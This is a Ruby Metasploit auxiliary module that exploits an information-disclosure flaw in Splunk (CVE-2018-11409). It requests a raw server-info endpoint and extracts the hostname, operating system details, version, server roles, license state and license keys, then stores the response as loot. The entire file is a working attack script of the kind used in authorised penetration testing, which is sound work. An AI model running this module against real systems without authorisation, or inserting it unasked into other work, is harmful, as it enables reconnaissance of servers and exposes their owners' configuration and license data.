##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Splunk __raw Server Info Disclosure ',
        'Description' => %q{
          Splunk through 6.2.3 7.0.1 allows information disclosure by appending
          /__raw/services/server/info/server-info?output_mode=json to a query.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'n00bhaxor', # msf module
          'KOF2002' # original PoC
        ],
        'References' => [
          [ 'EDB', '44865' ],
          [ 'URL', 'https://web.archive.org/web/20201124061756/https://www.splunk.com/en_us/product-security/announcements-archive/SP-CAAAP5E.html'],
          [ 'CVE', '2018-11409']
        ],
        'DisclosureDate' => '2018-06-08',
        'Notes' => {
          'Stability' => [],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )
    register_options(
      [
        Opt::RPORT(8000),
        OptString.new('USERNAME', [ false, 'User to login with', '']),
        OptString.new('PASSWORD', [ false, 'Password to login with', '']),
        OptString.new('TARGETURI', [ true, 'The URI of the Splunk Application', ''])
      ]
    )
  end

  def run
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'en-US', 'splunkd', '__raw', 'services', 'server', 'info', 'server-info'),
      'vars_get' => {
        'output_mode' => 'json'
      }
    )

    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Invalid response(response code: #{res.code})") unless res.code == 200
    begin
      j = JSON.parse(res.body)
    rescue JSON::ParserError
      return fail_with(Failure::UnexpectedReply, 'Response not JSON parsable')
    end
    loot_path = store_loot('splunk.system.status', 'application/json', datastore['RHOST'], res.body, 'system_status')
    print_good("Output saved to #{loot_path}")
    print_good("Hostname: #{j['entry'][0]['content']['host_fqdn']}")
    print_good("CPU Architecture: #{j['entry'][0]['content']['cpu_arch']}")
    print_good("Operating System: #{j['entry'][0]['content']['os_name']}")
    print_good("OS Build: #{j['entry'][0]['content']['os_build']}")
    print_good("OS Version: #{j['entry'][0]['content']['os_version']}")
    print_good("Splunk Version: #{j['generator']['version']}")
    print_good("Trial Version?: #{j['entry'][0]['content']['isTrial']}")
    print_good("Splunk Forwarder?: #{j['entry'][0]['content']['isForwarding']}")
    print_good("Splunk Product Type: #{j['entry'][0]['content']['product_type']}")
    print_good("License State: #{j['entry'][0]['content']['licenseState']}")
    print_good("License Key\(s\): #{j['entry'][0]['content']['licenseKeys']}")
    print_good("Splunk Server Roles: #{j['entry'][0]['content']['server_roles']}")
    converted_time = DateTime.strptime(j['entry'][0]['content']['startup_time'].to_s, '%s').strftime('%Y-%m-%d %H:%M:%S')
    print_good("Splunk Server Startup Time: #{converted_time}")
  end
end
